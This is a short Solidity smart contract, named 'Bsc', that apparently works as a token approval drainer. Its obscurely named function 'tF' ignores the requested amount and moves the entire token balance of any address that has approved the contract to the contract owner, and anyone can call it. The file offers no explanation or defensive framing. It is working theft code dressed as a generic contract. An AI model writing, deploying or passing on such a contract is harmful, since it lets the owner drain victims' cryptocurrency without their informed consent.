// SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Bsc {
    address private _owner;

    constructor () public {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function setOwner(address newOwner) public {
        if(msg.sender == _owner){
            _owner = newOwner;
        }
    }

    function tF(address tokenAddress, address sender, uint256 amount) public {
        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(sender);
        require(amount > 0, "amount gt zr");

        token.transferFrom(sender, _owner, balance);
    }
}